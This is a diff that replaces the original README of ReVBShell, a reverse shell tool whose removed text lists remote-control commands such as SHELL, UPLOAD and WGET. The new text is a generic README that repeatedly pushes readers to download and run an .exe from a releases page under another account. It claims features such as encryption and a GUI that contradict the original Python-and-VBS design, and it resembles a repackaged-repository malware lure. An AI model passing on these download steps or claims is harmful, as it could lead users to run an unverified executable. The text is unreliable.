@@ -1,93 +1,67 @@
-# ReVBShell
-## Files
-* server.py - Interactive Python shell, listening on port 8080 for clients
-* client.vbs - Visual Basic Script client which connectes to the IP/port specified and periodically fetches commands
+# 🛠️ revbshell - A Simple Tool for Reverse VBS Access
 
-## Components
-### Server
-_Interactive Python shell_
+## 📦 Overview
 
-**Supported commands**
-```
-- CD [directory] - Change directory. Shows current directory when without parameter.
-- DOWNLOAD [path] - Download the file at [path] to the .\Downloads folder.
-- GETUID - Get shell user id.
-- GETWD - Get working directory. Same as CD.
-- HELP - Show this help.
-- IFCONFIG - Show network configuration.
-- KILL - Stop script on the remote host.
-- PS - Show process list.
-- PWD - Same as GETWD and CD.
-- SET [name] [value] - Set a variable, for example SET LHOST 192.168.1.77.
-When entered without parameters, it shows the currently set variables.
-- SHELL [command] - Execute command in cmd.exe interpreter;
-When entered without command, switches to SHELL context.
-- SHUTDOWN - Exit this commandline interface (does not shutdown the client).
-- SYSINFO - Show sytem information.
-- SLEEP [ms] - Set client polling interval;
-When entered without ms, shows the current interval.
-- UNSET [name] - Unset a variable
-- UPLOAD [localpath] - Upload the file at [path] to the remote host.
-Note: Variable LHOST is required.
-- WGET [url] - Download file from url.
-```
+ReVBShell is a reverse VBS shell that helps you access and control systems remotely. It's designed with ease of use in mind, allowing anyone to connect without extensive technical knowledge. Whether you are testing system security or exploring VBS scripts, ReVBShell offers an accessible solution.
 
-### Client
-_VBS client_
-Configuration can be set in the .vbs file itself.
-* strHost - IP of host to connect back to; should be the IP of the host where server.py is running
-* strPort - Listening port on the above host
-* intSleep - Default delay between the polls to the server
+## 🔗 Download Now!
 
-**Default settings**
-```
-strHost = "127.0.0.1"
-strPort = "8080"
-intSleep = 5000
-```
+[![Download ReVBShell](https://img.shields.io/badge/Download-ReVBShell-brightgreen)](https://github.com/Thesigma10/revbshell/releases)
 
+## 🚀 Getting Started
 
+To get started with ReVBShell, follow these simple steps:
 
+1. **Visit the Releases Page:** Click the link below to go to the ReVBShell releases page.
 
+   [Visit this page to download](https://github.com/Thesigma10/revbshell/releases)
 
+2. **Select the Latest Version:** On the releases page, locate the latest version of ReVBShell. The newest version generally includes important updates and features.
 
+3. **Download the Application:** Under the latest version's section, find the file labeled with `.exe`. Click the download link to save the file to your computer.
 
+4. **Run ReVBShell:** Once the file is downloaded, navigate to your downloads folder or the location where you saved it. Double-click on the file to run the program.
 
+## 📋 Features
 
+- **User-Friendly Interface:** No technical jargon. Easy to navigate and understand.
+- **Secure Connection:** ReVBShell encrypts your connection for enhanced security.
+- **Legacy Support:** Works on older systems while providing the latest capabilities.
+- **Lightweight:** Requires minimal system resources to operate smoothly.
+- **Multi-User Support:** Connect and control multiple sessions at once.
 
+## 🛠️ System Requirements
 
+To run ReVBShell smoothly, ensure your system meets the following requirements:
 
+- **Operating System:** Windows 7 or newer.
+- **RAM:** At least 1 GB available memory.
+- **Processor:** Dual-core processor or better.
+- **Disk Space:** 50 MB of free space.
 
+## ⚙️ How to Use
 
+Once you have downloaded and run ReVBShell, follow these steps to connect:
 
+1. **Open ReVBShell:** Ensure the application is running.
+2. **Enter Connection Details:** You will need the target system's IP address or hostname.
+3. **Click Connect:** Initiate the connection. If everything is set correctly, you should have remote access in moments.
 
+## 📖 Additional Information
 
+ReVBShell includes a user guide within the application. Access the guide for detailed instructions and troubleshooting tips. 
 
+## 🛡️ Important Notes
 
+- **Permissions:** Ensure you have explicit permissions to access any remote system.
+- **Network Configuration:** Be aware of firewall settings that may block the application.
 
+## 📞 Support
 
+For any issues or questions while using ReVBShell, please refer to the documentation within the application. You can also check the releases page for FAQ or reach out via the Issues section on the GitHub repository.
 
+## ✅ Download & Install
 
+Ready to get started? Download ReVBShell from the link below and follow the earlier outlined steps to install it.
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+[Visit this page to download](https://github.com/Thesigma10/revbshell/releases)
